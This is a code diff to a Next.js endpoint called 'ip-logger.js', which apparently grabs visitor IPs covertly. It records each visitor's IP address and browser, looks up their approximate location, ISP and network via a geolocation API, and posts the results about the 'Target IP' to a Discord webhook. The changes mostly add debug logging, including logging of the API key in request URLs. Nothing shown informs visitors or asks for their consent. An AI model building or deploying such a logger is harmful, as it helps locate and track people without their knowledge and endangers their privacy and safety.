@@ -1,4 +1,4 @@
-// /pages/api/ip-logger.js - COMPLETE WITH ASN DATA & CONFIDENCE AREA DETAILS
+// /pages/api/ip-logger.js - WITH DEBUGGING AND FIXES
 export default async function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -19,61 +19,152 @@ export default async function handler(req, res) {
     clientIP = clientIP.replace(/^::ffff:/, '');
     const userAgent = (req.headers['user-agent'] || 'Unknown').toString();
 
-    console.log('DEBUG: Starting for IP:', clientIP);
+    console.log('DEBUG [1]: Starting for IP:', clientIP);
+    console.log('DEBUG [2]: User-Agent:', userAgent.substring(0, 50));
 
     // --- API Key Check ---
     const KEY = process.env.BIGDATACLOUD_API_KEY;
     if (!KEY) {
-      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
+      console.error('DEBUG [3]: Missing BIGDATACLOUD_API_KEY');
       return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
     }
+    console.log('DEBUG [4]: API Key available (first 8 chars):', KEY.substring(0, 8), '...');
 
     const BASE = 'https://api-bdc.net/data';
     
     // --- 1. Fetch Main Geolocation Data ---
     const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
     
+    console.log('DEBUG [5]: Fetching from GEO_URL:', GEO_URL);
+    
     let ipData = {};
     try {
       const response = await fetch(GEO_URL);
+      console.log('DEBUG [6]: Geolocation API response status:', response.status);
+      
       if (!response.ok) {
-        console.error(`DEBUG: Geolocation API error ${response.status}`);
+        const errorText = await response.text();
+        console.error(`DEBUG [7]: Geolocation API error ${response.status}:`, errorText.substring(0, 200));
         return res.status(502).json({ success: false, error: `API error: ${response.status}` });
       }
       
       const rawText = await response.text();
+      console.log('DEBUG [8]: Raw response length:', rawText.length, 'chars');
+      
       ipData = JSON.parse(rawText);
-      console.log('DEBUG: Main geolocation fetch OK');
+      console.log('DEBUG [9]: JSON parsed successfully');
+      
+      // Log the structure of the response for debugging
+      console.log('DEBUG [10]: Top-level keys in ipData:', Object.keys(ipData));
+      console.log('DEBUG [11]: ipData.network object exists?', !!ipData.network);
+      if (ipData.network) {
+        console.log('DEBUG [12]: ipData.network keys:', Object.keys(ipData.network));
+        console.log('DEBUG [13]: ipData.network content:', JSON.stringify(ipData.network, null, 2));
+      }
+      console.log('DEBUG [14]: ipData.location keys:', ipData.location ? Object.keys(ipData.location) : 'No location');
+      console.log('DEBUG [15]: ipData.confidenceArea exists?', !!ipData.confidenceArea);
+      console.log('DEBUG [16]: ipData.confidenceArea type:', typeof ipData.confidenceArea);
+      if (ipData.confidenceArea) {
+        console.log('DEBUG [17]: ipData.confidenceArea is array?', Array.isArray(ipData.confidenceArea));
+        if (Array.isArray(ipData.confidenceArea)) {
+          console.log('DEBUG [18]: ipData.confidenceArea length:', ipData.confidenceArea.length);
+          if (ipData.confidenceArea.length > 0) {
+            console.log('DEBUG [19]: First point of confidenceArea:', ipData.confidenceArea[0]);
+          }
+        }
+      }
+      
     } catch (fetchError) {
-      console.error('DEBUG: Geolocation fetch failed:', fetchError.message);
+      console.error('DEBUG [20]: Geolocation fetch failed:', fetchError.message);
       return res.status(500).json({ success: false, error: 'Failed to fetch geolocation data' });
     }
 
-    // --- 2. Fetch ASN Data if Available ---
+    // --- 2. Extract ASN Number from Main Response (Check multiple possible fields) ---
+    let asnNumber = null;
+    
+    // Try multiple possible fields for ASN
+    const possibleAsnFields = [
+      'autonomousSystemNumber',
+      'asn',
+      'asnNumeric',
+      'network.autonomousSystemNumber',
+      'network.asn',
+      'network.asnNumeric'
+    ];
+    
+    console.log('DEBUG [21]: Looking for ASN in possible fields...');
+    
+    for (const field of possibleAsnFields) {
+      if (field.includes('.')) {
+        // Handle nested fields
+        const parts = field.split('.');
+        let value = ipData;
+        for (const part of parts) {
+          if (value && typeof value === 'object') {
+            value = value[part];
+          } else {
+            value = null;
+            break;
+          }
+        }
+        if (value) {
+          asnNumber = value;
+          console.log(`DEBUG [22]: Found ASN in nested field '${field}':`, asnNumber);
+          break;
+        }
+      } else {
+        // Handle top-level fields
+        if (ipData[field]) {
+          asnNumber = ipData[field];
+          console.log(`DEBUG [23]: Found ASN in top-level field '${field}':`, asnNumber);
+          break;
+        }
+      }
+    }
+    
+    // Also check if network object exists and has ASN
+    if (!asnNumber && ipData.network) {
+      console.log('DEBUG [24]: Checking ipData.network object for ASN:');
+      console.log('DEBUG [25]: ipData.network =', JSON.stringify(ipData.network, null, 2));
+    }
+    
+    if (!asnNumber) {
+      console.warn('DEBUG [26]: No ASN number found in any expected field');
+    } else {
+      console.log('DEBUG [27]: Using ASN number:', asnNumber);
+    }
+
+    // --- 3. Fetch ASN Data if Available ---
     let asnData = {};
-    const asnNumber = ipData?.network?.autonomousSystemNumber;
     
     if (asnNumber) {
-      const ASN_URL = `${BASE}/asn-info-full?asn=AS${asnNumber}&localityLanguage=en&key=${KEY}`;
-      console.log('DEBUG: Fetching ASN data from:', ASN_URL);
+      // Ensure ASN number is properly formatted (remove 'AS' prefix if present)
+      const cleanAsnNumber = String(asnNumber).replace(/^AS/i, '');
+      const ASN_URL = `${BASE}/asn-info-full?asn=AS${cleanAsnNumber}&localityLanguage=en&key=${KEY}`;
+      
+      console.log('DEBUG [28]: Fetching ASN data from:', ASN_URL);
       
       try {
         const asnResponse = await fetch(ASN_URL);
+        console.log('DEBUG [29]: ASN API response status:', asnResponse.status);
+        
         if (asnResponse.ok) {
           const asnText = await asnResponse.text();
+          console.log('DEBUG [30]: ASN response length:', asnText.length, 'chars');
+          
           asnData = JSON.parse(asnText);
-          console.log('DEBUG: ASN data fetched successfully, keys:', Object.keys(asnData));
+          console.log('DEBUG [31]: ASN data parsed successfully, keys:', Object.keys(asnData));
+          console.log('DEBUG [32]: ASN data organization:', asnData.organisation || 'Not found');
         } else {
-          console.warn('DEBUG: ASN API failed with status:', asnResponse.status);
+          const errorText = await asnResponse.text();
+          console.warn('DEBUG [33]: ASN API failed with status:', asnResponse.status, 'Error:', errorText.substring(0, 200));
         }
       } catch (asnError) {
-        console.warn('DEBUG: ASN fetch error:', asnError.message);
+        console.warn('DEBUG [34]: ASN fetch error:', asnError.message);
       }
-    } else {
-      console.warn('DEBUG: No ASN number found in main response');
     }
 
-    // --- Extract Main Location Data ---
+    // --- 4. Extract Main Location Data ---
     const latitude = ipData?.location?.latitude || null;
     const longitude = ipData?.location?.longitude || null;
     const continent = ipData?.location?.continent || 'Unknown';
@@ -86,27 +177,50 @@ export default async function handler(req, res) {
     const currency = ipData?.country?.currency?.code || '';
     
     // Use ASN data for network information (from the detailed ASN API)
-    const isp = asnData?.organisation || ipData?.network?.organisation || 'Unknown';
-    const asn = asnData?.asn || (asnNumber ? `AS${asnNumber}` : 'Unknown');
-    const connectionType = ipData?.network?.connectionType || 'Unknown';
+    const isp = asnData?.organisation || ipData?.network?.organisation || ipData?.network?.carrier?.name || 'Unknown';
     
+    // Format ASN properly
+    let asn = 'Unknown';
+    if (asnData?.asn) {
+      asn = asnData.asn;
+    } else if (asnNumber) {
+      // Ensure ASN has 'AS' prefix
+      const cleanAsn = String(asnNumber).replace(/^AS/i, '');
+      asn = `AS${cleanAsn}`;
+    }
+    
+    const connectionType = ipData?.network?.connectionType || 'Unknown';
     const confidence = ipData?.confidence || 'unknown';
     const confidenceArea = ipData?.confidenceArea || null;
     const accuracyRadius = ipData?.location?.accuracyRadius || null;
     const timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';
 
-    // --- Process Confidence Area Data ---
+    console.log('DEBUG [35]: Extracted main data:');
+    console.log('DEBUG [36]: - Latitude:', latitude);
+    console.log('DEBUG [37]: - Longitude:', longitude);
+    console.log('DEBUG [38]: - ISP:', isp);
+    console.log('DEBUG [39]: - ASN:', asn);
+    console.log('DEBUG [40]: - Connection Type:', connectionType);
+    console.log('DEBUG [41]: - Confidence:', confidence);
+    console.log('DEBUG [42]: - Confidence Area exists?', !!confidenceArea);
+    console.log('DEBUG [43]: - Timezone:', timezone);
+
+    // --- 5. Process Confidence Area Data ---
     let confidenceInfo = {
       hasData: false,
       rawCoordinates: [],
       pointCount: 0,
       validPointCount: 0,
       bounds: null,
-      statistics: null
+      statistics: null,
+      error: null
     };
 
+    console.log('DEBUG [44]: Processing confidence area...');
+    
     if (confidenceArea && Array.isArray(confidenceArea)) {
       try {
+        console.log('DEBUG [45]: Confidence area is array, length:', confidenceArea.length);
         confidenceInfo.hasData = true;
         confidenceInfo.pointCount = confidenceArea.length;
         
@@ -116,6 +230,7 @@ export default async function handler(req, res) {
             const lon = point[0];
             const lat = point[1];
             
+            // Validate that both are numbers
             if (typeof lon === 'number' && typeof lat === 'number' && 
                 !isNaN(lon) && !isNaN(lat)) {
               confidenceInfo.validPointCount++;
@@ -125,10 +240,16 @@ export default async function handler(req, res) {
                 latitude: lat,
                 formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
               };
+            } else {
+              console.log(`DEBUG [46]: Point ${index} invalid: lon=${typeof lon}, lat=${typeof lat}`);
             }
+          } else {
+            console.log(`DEBUG [47]: Point ${index} is not a valid array:`, point);
           }
           return null;
         }).filter(point => point !== null);
+
+        console.log('DEBUG [48]: Valid points found:', confidenceInfo.validPointCount, 'out of', confidenceInfo.pointCount);
 
         // Calculate bounds if we have valid points
         if (confidenceInfo.validPointCount > 0) {
@@ -162,16 +283,26 @@ export default async function handler(req, res) {
             widthKm: lonKm.toFixed(2),
             heightKm: latKm.toFixed(2)
           };
+          
+          console.log('DEBUG [49]: Confidence area bounds calculated:', confidenceInfo.bounds);
+        } else {
+          confidenceInfo.error = 'No valid coordinate points found in confidence area';
+          console.warn('DEBUG [50]:', confidenceInfo.error);
         }
-        
-        console.log('DEBUG: Processed', confidenceInfo.validPointCount, 'confidence area points');
       } catch (error) {
-        console.error('DEBUG: Error processing confidence area:', error.message);
         confidenceInfo.error = error.message;
+        console.error('DEBUG [51]: Error processing confidence area:', error.message);
+        console.error('DEBUG [52]: Error stack:', error.stack);
+      }
+    } else {
+      console.log('DEBUG [53]: No confidence area data or not an array');
+      if (confidenceArea) {
+        console.log('DEBUG [54]: Confidence area type:', typeof confidenceArea);
+        console.log('DEBUG [55]: Confidence area value:', confidenceArea);
       }
     }
 
-    // --- Build Data Objects ---
+    // --- 6. Build Data Objects ---
     const mainData = {
       ip: clientIP,
       timestamp: new Date().toISOString(),
@@ -208,13 +339,15 @@ export default async function handler(req, res) {
       confidenceArea: {
         hasData: confidenceInfo.hasData,
         pointCount: confidenceInfo.pointCount,
-        validPoints: confidenceInfo.validPointCount
+        validPoints: confidenceInfo.validPointCount,
+        error: confidenceInfo.error
       }
     };
 
-    console.log('DEBUG: Main data ready, ASN:', mainData.network.asn);
+    console.log('DEBUG [56]: Main data ready, ASN:', mainData.network.asn);
+    console.log('DEBUG [57]: Confidence info ready, hasData:', confidenceInfo.hasData);
 
-    // --- Send Discord Webhooks ---
+    // --- 7. Send Discord Webhooks ---
     const webhookResults = {
       main: { sent: false, error: null },
       confidence: { sent: false, error: null },
@@ -222,46 +355,70 @@ export default async function handler(req, res) {
     };
 
     const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
+    console.log('DEBUG [58]: Discord webhook URL available?', !!DISCORD_WEBHOOK);
+    
     if (DISCORD_WEBHOOK) {
       try {
+        console.log('DEBUG [59]: Starting to send webhooks...');
+        
         // 1. Send MAIN webhook with location and basic ASN
-        await sendMainWebhook(mainData, DISCORD_WEBHOOK);
-        webhookResults.main.sent = true;
-        console.log('DEBUG: Main webhook sent');
+        console.log('DEBUG [60]: Sending main webhook...');
+        try {
+          await sendMainWebhook(mainData, DISCORD_WEBHOOK);
+          webhookResults.main.sent = true;
+          console.log('DEBUG [61]: Main webhook sent successfully');
+        } catch (mainError) {
+          webhookResults.main.error = mainError.message;
+          console.error('DEBUG [62]: Main webhook failed:', mainError.message);
+        }
         
         // 2. Send ASN DETAILS webhook if we have ASN data
         if (asnData && Object.keys(asnData).length > 0) {
+          console.log('DEBUG [63]: Sending ASN details webhook...');
           try {
             await sendAsnDetailsWebhook(mainData, asnData, DISCORD_WEBHOOK);
             webhookResults.asnDetails.sent = true;
-            console.log('DEBUG: ASN details webhook sent');
+            console.log('DEBUG [64]: ASN details webhook sent successfully');
           } catch (asnError) {
             webhookResults.asnDetails.error = asnError.message;
-            console.error('DEBUG: ASN webhook failed:', asnError.message);
+            console.error('DEBUG [65]: ASN webhook failed:', asnError.message);
           }
+        } else {
+          console.log('DEBUG [66]: No ASN data to send details webhook');
         }
         
         // 3. Send CONFIDENCE AREA webhook if we have confidence data
+        console.log('DEBUG [67]: Checking if we should send confidence webhook...');
+        console.log('DEBUG [68]: confidenceInfo.hasData:', confidenceInfo.hasData);
+        console.log('DEBUG [69]: confidenceInfo.validPointCount:', confidenceInfo.validPointCount);
+        
         if (confidenceInfo.hasData && confidenceInfo.validPointCount > 0) {
+          console.log('DEBUG [70]: Sending confidence area webhooks...');
           try {
             await sendConfidenceAreaWebhooks(mainData, confidenceInfo, DISCORD_WEBHOOK);
             webhookResults.confidence.sent = true;
-            console.log('DEBUG: Confidence area webhooks sent');
+            console.log('DEBUG [71]: Confidence area webhooks sent successfully');
           } catch (confError) {
             webhookResults.confidence.error = confError.message;
-            console.error('DEBUG: Confidence webhook failed:', confError.message);
+            console.error('DEBUG [72]: Confidence webhook failed:', confError.message);
+            console.error('DEBUG [73]: Confidence error stack:', confError.stack);
           }
+        } else {
+          console.log('DEBUG [74]: Not sending confidence webhook because:');
+          console.log('DEBUG [75]: - hasData:', confidenceInfo.hasData);
+          console.log('DEBUG [76]: - validPointCount:', confidenceInfo.validPointCount);
+          console.log('DEBUG [77]: - error:', confidenceInfo.error);
         }
         
-      } catch (mainError) {
-        webhookResults.main.error = mainError.message;
-        console.error('DEBUG: Main webhook failed:', mainError.message);
+      } catch (globalError) {
+        console.error('DEBUG [78]: Global webhook error:', globalError.message);
       }
     } else {
-      console.warn('DEBUG: No DISCORD_WEBHOOK_URL set');
+      console.warn('DEBUG [79]: No DISCORD_WEBHOOK_URL set');
     }
 
-    // --- Return Response ---
+    // --- 8. Return Response ---
+    console.log('DEBUG [80]: Returning final response');
     return res.status(200).json({
       success: true,
       data: {
@@ -273,14 +430,23 @@ export default async function handler(req, res) {
           totalPoints: confidenceInfo.pointCount,
           validPoints: confidenceInfo.validPointCount,
           bounds: confidenceInfo.bounds,
-          statistics: confidenceInfo.statistics
+          statistics: confidenceInfo.statistics,
+          error: confidenceInfo.error
+        },
+        debug: {
+          asnFoundInMain: !!asnNumber,
+          asnNumber: asnNumber,
+          asnDataKeys: asnData ? Object.keys(asnData) : [],
+          confidenceAreaType: typeof confidenceArea,
+          confidenceAreaIsArray: Array.isArray(confidenceArea)
         }
       },
       webhooks: webhookResults
     });
 
   } catch (err) {
-    console.error('Handler error:', err);
+    console.error('DEBUG [ERROR]: Handler error:', err.message);
+    console.error('DEBUG [ERROR]: Stack:', err.stack);
     return res.status(500).json({ 
       success: false, 
       error: 'Internal server error',
@@ -315,6 +481,8 @@ function parseUserAgent(ua) {
 
 // --- Webhook 1: MAIN LOCATION & BASIC ASN ---
 async function sendMainWebhook(data, webhookUrl) {
+  console.log('DEBUG [WEBHOOK1]: Creating main webhook embed...');
+  
   const embed = {
     embeds: [{
       title: '🌐 IP Location Report',
@@ -398,20 +566,27 @@ async function sendMainWebhook(data, webhookUrl) {
     }]
   };
 
+  console.log('DEBUG [WEBHOOK1]: Sending to Discord...');
+  
   const response = await fetch(webhookUrl, { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify(embed)
   });
   
+  console.log('DEBUG [WEBHOOK1]: Discord response status:', response.status);
+  
   if (!response.ok) {
     const errorText = await response.text();
+    console.error('DEBUG [WEBHOOK1]: Discord error response:', errorText.substring(0, 200));
     throw new Error(`Discord API: ${response.status}`);
   }
 }
 
 // --- Webhook 2: ASN DETAILS (from asn-info-full API) ---
 async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
+  console.log('DEBUG [WEBHOOK2]: Creating ASN details webhook...');
+  
   const fields = [
     { 
       name: '📍 Target IP', 
@@ -498,14 +673,19 @@ async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
     }]
   };
 
+  console.log('DEBUG [WEBHOOK2]: Sending to Discord...');
+  
   const response = await fetch(webhookUrl, { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify(embed)
   });
   
+  console.log('DEBUG [WEBHOOK2]: Discord response status:', response.status);
+  
   if (!response.ok) {
     const errorText = await response.text();
+    console.error('DEBUG [WEBHOOK2]: Discord error response:', errorText.substring(0, 200));
     throw new Error(`Discord API: ${response.status}`);
   }
 }
@@ -513,6 +693,8 @@ async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
 // --- Webhook 3: CONFIDENCE AREA DATA (multiple messages if needed) ---
 async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) {
   const totalPoints = confidenceInfo.rawCoordinates.length;
+  
+  console.log(`DEBUG [WEBHOOK3]: Starting confidence area webhooks with ${totalPoints} points`);
   
   // Part 1: Confidence Area Statistics
   const statsEmbed = {
@@ -592,11 +774,13 @@ async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) 
   }
 
   // Send Part 1
-  await fetch(webhookUrl, { 
+  console.log('DEBUG [WEBHOOK3-P1]: Sending Part 1 (Statistics)...');
+  const response1 = await fetch(webhookUrl, { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify(statsEmbed)
   });
+  console.log('DEBUG [WEBHOOK3-P1]: Discord response status:', response1.status);
 
   // Part 2: First 15 Coordinate Points
   if (totalPoints > 0) {
@@ -614,7 +798,7 @@ async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) 
       }]
     };
 
-        // Add coordinates in groups of 5
+    // Add coordinates in groups of 5
     for (let i = 0; i < batch1.length; i += 5) {
       const group = batch1.slice(i, i + 5);
       const coordText = group.map(p => `${p.index}. ${p.formatted}`).join('\n');
@@ -626,11 +810,13 @@ async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) 
     }
 
     // Send Part 2
-    await fetch(webhookUrl, { 
+    console.log('DEBUG [WEBHOOK3-P2]: Sending Part 2 (Coordinates 1-15)...');
+    const response2 = await fetch(webhookUrl, { 
       method: 'POST', 
       headers: { 'Content-Type': 'application/json' }, 
       body: JSON.stringify(coordEmbed1)
     });
+    console.log('DEBUG [WEBHOOK3-P2]: Discord response status:', response2.status);
 
     // Part 3: More coordinates if available
     if (totalPoints > 15) {
@@ -669,11 +855,13 @@ async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) 
       }
 
       // Send Part 3
-      await fetch(webhookUrl, { 
+      console.log('DEBUG [WEBHOOK3-P3]: Sending Part 3 (Coordinates 16-30)...');
+      const response3 = await fetch(webhookUrl, { 
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' }, 
         body: JSON.stringify(coordEmbed2)
       });
+      console.log('DEBUG [WEBHOOK3-P3]: Discord response status:', response3.status);
     }
-  }
+        }
 }
